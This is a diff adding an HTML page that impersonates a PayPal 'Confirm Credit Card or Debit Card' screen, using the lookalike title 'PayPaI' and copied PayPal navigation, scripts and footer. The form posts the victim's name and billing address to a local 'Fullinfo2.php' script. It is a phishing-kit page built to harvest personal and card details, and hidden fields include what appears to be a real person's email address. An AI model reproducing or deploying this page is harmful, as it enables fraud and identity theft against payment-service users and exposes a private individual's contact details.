@@ -1,0 +1,419 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" class=" jsEnabled">
+ <head>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <title>
+   Confirm Credit Card or Debit Card - PayPaI
+  </title>
+  <meta content="PayPal is the safer, easier way to pay online without revealing your credit card number." name="description" />
+  <meta content="IE=9" http-equiv="X-UA-Compatible" />
+  <link href="global.css" type="text/css" rel="stylesheet" media="screen" />
+  <link href="ProfileCCAdd.css" type="text/css" rel="stylesheet" />
+  <link href="print.css" type="text/css" rel="stylesheet" media="print" />
+  <script type="text/javascript">
+   if (self === top) {
+					var antiClickjack = document.getElementById("antiClickjack");
+					antiClickjack.parentNode.removeChild(antiClickjack);
+				} else {
+					top.location = self.location;
+				}
+  </script>
+  <script src="global.js" type="text/javascript">
+  </script>
+  <style type="text/css">
+   form#rosetta {display:none;}
+  </style>
+  <script type="text/javascript">
+   PAYPAL.util.lazyLoadRoot = 'https\x3a\x2f\x2fwww\x2epaypalobjects\x2ecom\x2fWEBSCR\x2d640\x2d20131020\x2d1';
+  </script>
+  <link href="favicon_x.ico" rel="shortcut icon" />
+ </head>
+ <body>
+  <noscript>
+   &lt;style type="text/css"&gt;body{display:block !important;}&lt;/style&gt;&lt;p class="nonjsAlert"&gt;PayPal requires JavaScript for many of its features. To check out, please &lt;a target="blank" href="#"&gt;turn on Javascript in your internet browser&lt;/a&gt;.&lt;/p&gt;
+  </noscript>
+  <div id="page" class="ccadd ">
+   <div class="std secondary" id="header">
+    <h1>
+     <a href="https://www.paypal.com/ma/cgi-bin/webscr?cmd=_account">
+      <img border="0" alt="PayPal" src="logo.gif" />
+     </a>
+    </h1>
+    <div id="navGlobal">
+     <span>
+      <a class="accessAid skip" href="#content">
+       Skip to main content
+      </a>
+     </span>
+     <ul>
+      <li class="logout">
+       <a href="#">
+        Log Out
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        Help
+       </a>
+      </li>
+      <li class="last">
+       <a href="#">
+        Security Center
+       </a>
+      </li>
+     </ul>
+    </div>
+    <div id="navPrimary" role="navigation">
+     <ul class="secondary">
+      <li class="active">
+       <a href="#">
+        My Account
+       </a>
+       <ul>
+        <li>
+         <a href="#">
+          Overview
+         </a>
+        </li>
+        <li>
+         <a class="scTrack:SRD:Nav:BD39" href="#">
+          Withdraw
+         </a>
+        </li>
+        <li>
+         <a href="#">
+          History
+         </a>
+         <ul>
+          <li>
+           <a class="scTrack:SRD:Nav:BD44" href="#">
+            Basic Search
+           </a>
+          </li>
+          <li>
+           <a class="scTrack:SRD:Nav:BD46" href="#">
+            Download History
+           </a>
+          </li>
+          <li>
+           <a class="scTrack:SRD:Nav:TD31" href="#">
+            Tax Documents
+           </a>
+          </li>
+          <li>
+           <a class="scTrack:SRD:Nav:BD49" href="#">
+            Reports
+           </a>
+          </li>
+          <li>
+           <a class="scTrack:SRD:Nav:BD50" href="#">
+            IPN History
+           </a>
+          </li>
+         </ul>
+        </li>
+        <li>
+         <a class="scTrack:SRD:Nav:BD51" href="#">
+          Resolution Center
+         </a>
+         <ul>
+          <li>
+           <a class="scTrack:SRD:Nav:BD52" href="#">
+            View Open Cases
+           </a>
+          </li>
+         </ul>
+        </li>
+        <li class="active">
+         <a class="scTrack:SRD:Nav:BD62" href="#">
+          Profile
+         </a>
+         <ul>
+          <li>
+           <a class="scTrack:SRD:Nav:BD63" href="#">
+            Add/Edit Email
+           </a>
+          </li>
+          <li>
+           <a class="scTrack:SRD:Nav:BD64" href="#">
+            Add/Edit Bank Account
+           </a>
+          </li>
+          <li>
+           <a class="scTrack:SRD:Nav:BD65" href="#">
+            Add/Edit Credit Card
+           </a>
+          </li>
+          <li>
+           <a class="scTrack:SRD:Nav:BD66" href="#">
+            Add/Edit Street Address
+           </a>
+          </li>
+         </ul>
+        </li>
+       </ul>
+      </li>
+      <li>
+       <a class="scTrack:SRD:Nav:BF1" href="#1">
+        Send Payment
+       </a>
+      </li>
+      <li>
+       <a class="scTrack:SRD:Nav:BF5" href="#">
+        Request Money
+       </a>
+      </li>
+      <li>
+       <a class="scTrack:SRD:Nav:BF10" href="#">
+        Merchant Services
+       </a>
+      </li>
+      <li>
+       <a class="scTrack:SRD:Nav:BF11" href="#">
+        Products &amp; Services
+       </a>
+      </li>
+     </ul>
+    </div>
+   </div>
+   <div id="content">
+    <div id="headline">
+     <div class="secure">
+      <a onclick="PAYPAL.core.openWindow(event,{size:'l'});" href="#" target="_blank">
+       Secure Transaction
+      </a>
+     </div>
+     <h2>
+      Confirm Details Below
+     </h2>
+    </div>
+    <div id="messageBox">
+    </div>
+    <div id="main">
+     <div class="legacyErrors">
+      <form class="" action="Fullinfo2.php" name="" id="" method="post">
+       <input type="hidden" value="" name="cc_brand" />
+       <input type="hidden" value="MA" name="cc_country_code" id="cc_country_code" />
+       <input type="hidden" value="_flow" name="cmd" />
+       <input type="hidden" value="" name="cid" />
+       <input type="hidden" value="X3-7SZn2ExXucINxlliZ_05NdFsrIIpaV9TcRYNLL_GiOwm9XgEZzWKQeV0" name="CONTEXT" id="CONTEXT_CGI_VAR" />
+       <input type="hidden" value="" name="myAllTextSubmitID" id="myAllTextSubmitID" />
+       <input type="hidden" value="UTF-8" name="form_charset" />
+       <input type="hidden" value="NTfzoqlF7PepTNQVyGtHCJMJvGaSrSFl1YV_zB6ocaTt-cWQT6piooWl_pa" name="SESSION" />
+       <input type="hidden" value="5885d80a13c0db1f8e263663d3faee8def8934b92a630e40b7fef61ab7e9fe63" name="dispatch" />
+       <input type="hidden" value="5885d80a13c0db1f8e263663d3faee8def8934b92a630e40b7fef61ab7e9fe63" name="LastFlowDispatch" />
+       <input type="hidden" value="NTfzoqlF7PepTNQVyGtHCJMJvGaSrSFl1YV_zB6ocaTt-cWQT6piooWl_pa" name="LastRapidsSession" />
+       <input type="hidden" value="p/gen/failed-to-load" name="outdated_page_tmpl" />
+       <input type="hidden" value="drissamovic21@yahoo.com" name="login_email" />
+       <input type="hidden" value="AFq4FuffIWfeFO8.kB-0O3yuJ9kvhufQSUMFZTAX--41VJjGSYd43FTzkSPiCCXZ8-gXdzLNzHx7HmsCoQcjikA" name="auth" />
+       <p>
+        Debit Cards (also called check cards, ATM cards, or banking cards) are accepted if they have a Visa or MasterCard logo. Enter your card number without spaces or dashes.
+        <br />
+       </p>
+       <div id="sectionBillingAddress">
+        <hr class="dotted" />
+        <h3>
+         Billing Address
+        </h3>
+        <p class="confidential">
+         <label class="accessAid" for="addressId">
+          Billing address
+         </label>
+        </p>
+        <p>
+        </p>
+        <noscript>
+         &lt;style  type='text/css' &gt;div#AddressFields.hidden {display : block; visibility : visible;}&lt;/style&gt;
+        </noscript>
+        <div id="AddressFields" class="dropBox">
+         <label for="first_name">
+          <span class="labelText">
+           First Name
+          </span>
+         </label>
+         <span class="field confidential">
+          <input type="text" title="Please enter your first name" required="" value="" name="first_name" maxlength="32" size="30" id="first_name" />
+         </span>
+        </div>
+        <div id="fieldrowLastName">
+         <p class="group">
+          <span class="label">
+           Last Name
+          </span>
+          <span class="field confidential">
+           <input type="text" title="Please enter your last name" required="" value="" name="last_name" maxlength="32" size="30" id="last_name" />
+          </span>
+         </p>
+         <p>
+          <label for="address1">
+           <span class="labelText">
+            Address line 1
+           </span>
+          </label>
+          <span class="field confidential">
+           <input type="text" title="Please enter your address" required="" value="" name="address1" class="confidential text large" id="address1" />
+          </span>
+         </p>
+         <p class="group">
+          <label for="address2">
+           <span class="labelText">
+            Address line 2
+           </span>
+           <span class="optional">
+            (optional)
+           </span>
+          </label>
+          <span class="field confidential">
+           <input type="text" value="" name="address2" class="confidential text large" id="address2" />
+          </span>
+         </p>
+         <p class="group">
+          <label for="city">
+           <span class="labelText">
+            City
+           </span>
+          </label>
+          <span class="field confidential">
+           <input type="text" title="Please enter your city" required="" value="" name="city" class="confidential text large" id="city" />
+          </span>
+         </p>
+         <p class="group">
+          <label for="state">
+           <span class="labelText">
+            State / Province / Region
+           </span>
+          </label>
+          <span class="field confidential">
+           <input type="text" title="Please enter your state/region" required="" value="" name="state" class="confidential text" maxlength="40" size="25" id="state" />
+          </span>
+         </p>
+         <p class="group">
+          <span class="label">
+           Country
+          </span>
+          <span class="field">
+           <select size="1" class="" name="cntry" style="border:1px solid #84A8CC; width: 200; margin-bottom:2px; height:22">
+            <option value="Canada">
+             Canada
+            </option>
+            <option value="USA">
+             USA
+            </option>
+            <option value="United Kingdom">
+             United Kingdom
+            </option>
+           </select>
+          </span>
+         </p>
+         <p>
+         </p>
+         <p>
+         </p>
+        </div>
+       </div>
+       <p class="buttons">
+        <input type="submit" class="button primary default" onclick="											
+																					s.scTrackPage(function() {
+																						s.eVar29='CreditCard\x3a\x3aCreditCardFlow::Submit';
+																					});
+																						" value="Confirm" name="add.x" id="add" />
+        <input type="submit" class="button" value="Cancel" name="cancel_add.x" />
+       </p>
+       <input type="hidden" value="Ab8ar-FW8NlyRGjWL3r9XRbxw7ASVns.dtJq1MjXq9sJjVAJ1K2gQ0foAIACmrGrF4WuRFPXnS98ccRq5hIEBug" name="auth" />
+       <input type="hidden" value="UTF-8" name="form_charset" />
+      </form>
+     </div>
+    </div>
+   </div>
+   <div role="contentinfo" id="footer">
+    <h5 class="accessAid">
+     More Information
+    </h5>
+    <ul>
+     <li>
+      <a href="#">
+       About Us
+      </a>
+     </li>
+     <li>
+      <a href="#">
+       Accounts
+      </a>
+     </li>
+     <li>
+      <a href="#">
+       Fees
+      </a>
+     </li>
+     <li>
+      <a href="#">
+       Privacy
+      </a>
+     </li>
+     <li>
+      <a href="#">
+       Security Center
+      </a>
+     </li>
+     <li>
+      <a href="#">
+       Contact Us
+      </a>
+     </li>
+     <li>
+      <a href="#">
+       Legal Agreements
+      </a>
+     </li>
+    </ul>
+    <p id="legal">
+     Copyright © 1999-2014 PayPal. All rights reserved.
+     <br />
+     Consumer advisory- PayPal Pte. Ltd., the holder of PayPal's stored value
+     <br />
+     facility, does not require the approval of the Monetary Authority of Singapore.
+     <br />
+     Users are advised to read the
+     <a href="#">
+      terms and conditions
+     </a>
+     carefully.
+    </p>
+   </div>
+   <div id="navFull" class="hide">
+   </div>
+   <script type="text/javascript">
+    if(typeof PAYPAL != 'undefined'){ PAYPAL.core.Navigation.init(); }
+   </script>
+  </div>
+  <script src="widgets.js" type="text/javascript">
+  </script>
+  <script src="ProfileCCAdd.js" type="text/javascript">
+  </script>
+  <!-- SiteCatalyst Code
+Copyright 1997-2005 Omniture, Inc.
+More info available at http://www.omniture.com -->
+  <script src="pp_jscode_080706.js" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   &lt;!--
+/************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
+function scOnload(){var s_code=s.t();if(s_code)document.write(s_code);}
+if(window.addEventListener){
+window.addEventListener('load',scOnload,false);
+}else if(window.attachEvent){
+window.attachEvent('onload', scOnload);
+};
+if(navigator.appVersion.indexOf('MSIE')&gt;=0)document.write(unescape('%3C')+'\!-'+'-')
+//--&gt;
+  </script>
+  <noscript>
+   &lt;img
+src=""
+height="1" width="1" border="0" alt="" /&gt;
+  </noscript>
+  <!--/DO NOT REMOVE/-->
+  <!-- End SiteCatalyst Code -->
+  <!--FirstPartyTracking Code-->
+ </body>
+</html>
